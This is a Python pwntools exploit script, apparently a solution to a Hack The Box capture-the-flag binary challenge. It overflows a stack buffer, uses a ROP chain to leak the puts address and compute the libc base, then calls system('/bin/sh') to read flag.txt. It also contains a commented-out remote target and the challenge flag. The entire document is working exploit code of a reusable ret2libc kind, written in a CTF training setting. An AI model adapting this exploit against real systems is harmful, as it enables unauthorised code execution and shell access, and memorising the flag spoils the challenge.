from pwn import *

elf=ELF("./pb")
libc=ELF("./glibc/libc.so.6")
context(arch="amd64", os="linux")

stack=0x404100


p=elf.process()
# p=remote("165.227.224.40", 31721)

p.sendline(b"2")

# read 0x44
buffer=b"+"*0x30

rop=ROP(elf)
# leak puts
rop.call("puts", [elf.got["puts"]])
rop.call("main")

# print(rop.dump())
payload=buffer+p64(stack)+rop.chain()

p.sendline(payload)
p.recvuntil(b"thank you!\n\n")

def get_addr_from_puts():
    return u64(p.recvline()[:-1].ljust(8, b"\x00"))

puts_addr=get_addr_from_puts()
print("puts:", hex(puts_addr))

libc.address=puts_addr-libc.symbols["puts"]
print("libc:", hex(libc.address))


p.sendline(b"2")
rop=ROP(libc)
rop.call("puts", [elf.got["puts"]])
rop.call("system",[next(libc.search(b"/bin/sh\x00")),])

payload=buffer+p64(stack)+rop.chain()

p.sendline(payload)
p.sendline("cat flag.txt")


p.interactive()
# HTB{3sc4p3_fr0m_4b0v3}
